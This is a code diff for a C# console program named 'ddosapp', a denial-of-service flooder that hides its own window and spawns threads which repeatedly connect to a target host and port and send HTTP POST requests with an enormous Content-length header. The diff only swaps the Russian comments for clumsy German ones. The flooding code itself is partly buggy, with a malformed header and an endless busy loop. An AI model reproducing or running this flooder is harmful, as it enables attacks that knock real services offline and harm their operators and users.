@@ -22,9 +22,9 @@ namespace ddosapp
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             ShowWindow(handle, SW_HIDE);
-            string target = "127.0.0.1"; // хост цель
-            int port = 10134; // цель порт
-            long threads = 9000000000000000000; // число нитей
+            string target = "127.0.0.1"; // Gastgeber
+            int port = 10134; // Hafen
+            long threads = 9000000000000000000; // Nummer
 
             for(int i = 0; i < threads; i++)
             {
@@ -37,9 +37,9 @@ namespace ddosapp
                         {
                             TcpClient client = new TcpClient();
                             client.NoDelay = true;
-                            client.Connect(target, port); // подключение
+                            client.Connect(target, port); // Verbindung
                             StreamWriter stream = new StreamWriter(client.GetStream());
-                            stream.Write("POST / HTTP/1.1/r/nHost: " + target + "\r\nContent-length: 9000000000000000000\r\n\r\n"); // отправка пакетов
+                            stream.Write("POST / HTTP/1.1/r/nHost: " + target + "\r\nContent-length: 9000000000000000000\r\n\r\n"); // Pakete verschicken
                             stream.Flush();
                             client.Close();
                         }
@@ -51,7 +51,7 @@ namespace ddosapp
                     }
                 }).Start();
                 while (true) ;
-                // ожидание
+                // Erwartung
             }
         }
     }
